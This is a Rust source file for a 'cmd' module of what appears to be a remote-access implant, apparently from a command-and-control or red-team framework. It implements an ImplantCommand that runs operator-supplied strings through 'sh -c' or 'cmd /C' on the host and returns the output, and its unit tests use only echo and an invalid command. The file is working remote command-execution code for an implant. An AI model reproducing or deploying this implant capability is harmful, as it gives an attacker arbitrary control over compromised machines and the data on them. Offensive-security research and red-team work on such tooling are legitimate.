use std::process::Command;

use crate::commands::{CommandMeta, CommandResult, ImplantCommand, ImplantContext};

pub struct CmdCommand;

impl CmdCommand {
    const META: CommandMeta = CommandMeta {
        name: "cmd",
        description: "Execute a shell command",
        usage: "cmd <command> [args...]",
    };
}

impl ImplantCommand for CmdCommand {
    fn meta(&self) -> &CommandMeta {
        &Self::META
    }

    fn execute(&self, args: &[String], ctx: &mut ImplantContext) -> CommandResult {
        let (shell, flag) = if ctx.os == "windows" {
            ("cmd", "/C")
        } else {
            ("sh", "-c")
        };

        let output = Command::new(shell)
            .arg(flag)
            .arg(args.join(" "))
            .current_dir(&ctx.cwd)
            .output();

        match output {
            Ok(res) => {
                if res.status.success() {
                    CommandResult {
                        success: true,
                        output: String::from_utf8_lossy(&res.stdout).to_string(),
                    }
                } else {
                    CommandResult {
                        success: false,
                        output: String::from_utf8_lossy(&res.stderr).to_string(),
                    }
                }
            }
            Err(err) => CommandResult {
                success: false,
                output: err.to_string(),
            },
        }
    }
}

#[cfg(test)]
mod test {
    use super::*;
    use crate::commands::test_context;

    #[test]
    fn test_cmd_echo_split_args() {
        let cmd = CmdCommand;
        let mut ctx = test_context();
        let args = &["echo".to_string(), "hello you".to_string()];
        let res = cmd.execute(args, &mut ctx);

        assert_eq!(res.success, true);
        assert_eq!(res.output.trim(), "hello you");
    }

    #[test]
    fn test_cmd_echo_one_args() {
        let cmd = CmdCommand;
        let mut ctx = test_context();
        let args = &["echo hello you".to_string()];
        let res = cmd.execute(args, &mut ctx);

        assert_eq!(res.success, true);
        assert_eq!(res.output.trim(), "hello you");
    }

    #[test]
    fn test_invalid_cmd() {
        let cmd = CmdCommand;
        let mut ctx = test_context();
        let args = &["emo hello you".to_string()];
        let res = cmd.execute(args, &mut ctx);

        assert_eq!(res.success, false);
    }
}
